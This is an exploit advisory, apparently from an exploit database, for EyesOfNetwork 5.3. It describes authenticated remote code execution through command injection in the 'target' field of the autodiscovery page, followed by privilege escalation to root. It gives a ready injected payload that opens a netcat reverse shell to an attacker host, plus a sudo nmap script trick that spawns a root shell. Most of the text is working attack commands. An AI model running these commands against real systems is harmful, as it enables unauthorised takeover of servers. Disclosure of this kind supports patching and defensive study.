@@ -1,0 +1,26 @@
+# Exploit Title: EyesOfNetwork 5.3 - RCE & PrivEsc
+# Date: 10/01/2021
+# Exploit Author: Audencia Business SCHOOL Red Team
+# Vendor Homepage: https://www.eyesofnetwork.com/en
+# Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.3-x86_64-bin.iso
+# Version: 5.3
+
+#Authentified Romote Code Execution flaw > remote shell > PrivEsc
+#
+#An user with acces to "/autodiscover.php" can execute remote commande, get a reverse shell and root the targeted machine.
+
+==============================================
+Initial RCE
+
+In the webpage : https://EyesOfNetwork_IP/lilac/autodiscovery.php
+
+The "target" input is not controled. It's possible tu put any commands after an "&", RCE is possible with a simple netcat commande like : 
+
+& nc -e /bin/sh <IP> <PORT>
+==============================================
+PrivEsc
+
+The EyesOfNetwork apache user can run "nmap" with sudo privilege and with NOPASSWD attribut, so it's possible to become the root user when using classic PrivEsc methode :
+ 
+echo 'os.execute("/bin/sh")' > /tmp/nmap.script
+sudo nmap --script=/tmp/nmap.script
